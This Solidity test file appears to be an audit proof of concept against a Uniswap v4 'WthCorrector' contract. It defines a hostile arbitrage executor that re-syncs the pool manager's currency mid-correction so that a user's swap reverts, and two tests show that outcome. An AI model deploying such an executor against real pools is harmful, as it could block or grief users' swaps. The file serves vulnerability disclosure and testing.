// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";

import {IWETH} from "frontier/interfaces/IWETH.sol";
import {IWthArbitrageExecutor} from "contracts/wth-corrector/IWthArbitrageExecutor.sol";

import {PresyncRouterMock} from "../../wth-corrector/PresyncRouterMock.sol";
import {WthCorrectorTest} from "../../wth-corrector/WthCorrector.t.sol";

contract ResyncExecutor is IWthArbitrageExecutor {
    using TransientStateLibrary for IPoolManager;

    IPoolManager immutable pm;
    IWETH immutable weth;
    address immutable corrector;
    bool public resynced;

    constructor(IPoolManager _pm, IWETH _weth, address _corrector) {
        pm = _pm;
        weth = _weth;
        corrector = _corrector;
    }

    receive() external payable {}

    function executeArbitrage(PoolKey calldata key, address, ProfitSplit calldata) external returns (uint256) {
        // re-sync the currency the router already synced: CURRENCY_SLOT is unchanged, RESERVES_OF_SLOT moves
        if (Currency.unwrap(pm.getSyncedCurrency()) == Currency.unwrap(key.currency1)) {
            pm.sync(key.currency1);
            resynced = true;
        }
        weth.deposit{value: 1e15}();
        weth.transfer(corrector, 1e15);
        return 0;
    }
}

contract ResyncPoCTest is WthCorrectorTest {
    function test_PoC_resyncPassesDigestAndRevertsUserSwap() public {
        uint256 coinIn = 1_000_000 ether;
        PresyncRouterMock router = new PresyncRouterMock(poolManager);
        vm.prank(users.buyerOne);
        wCoin.transfer(address(router), coinIn);

        // control: the honest executor lets the round trip complete (existing test also proves this)
        uint256 snap = vm.snapshot();
        executor.setPay(executor.payMode(), PAYMENT);
        router.roundTrip(plainKey, key, coinIn);
        vm.revertTo(snap);

        ResyncExecutor hostile = new ResyncExecutor(poolManager, IWETH(address(weth)), address(corrector));
        vm.deal(address(hostile), 1 ether);
        vm.prank(users.owner);
        corrector.setExecutor(address(hostile));

        // the digest does not see the reserves change, the correction settles, then the router's settle pays 0
        vm.expectRevert();
        router.roundTrip(plainKey, key, coinIn);
    }

    function test_PoC_resyncCorrectionSettlesInIsolation() public {
        // same flow, but measure that the correction itself passed the digest (executor ran and paid)
        uint256 coinIn = 1_000_000 ether;
        PresyncRouterMock router = new PresyncRouterMock(poolManager);
        vm.prank(users.buyerOne);
        wCoin.transfer(address(router), coinIn);
        ResyncExecutor hostile = new ResyncExecutor(poolManager, IWETH(address(weth)), address(corrector));
        vm.deal(address(hostile), 1 ether);
        vm.prank(users.owner);
        corrector.setExecutor(address(hostile));
        try router.roundTrip(plainKey, key, coinIn) {
            revert("expected revert");
        } catch (bytes memory reason) {
            emit log_named_bytes("revert reason", reason);
        }
    }
}
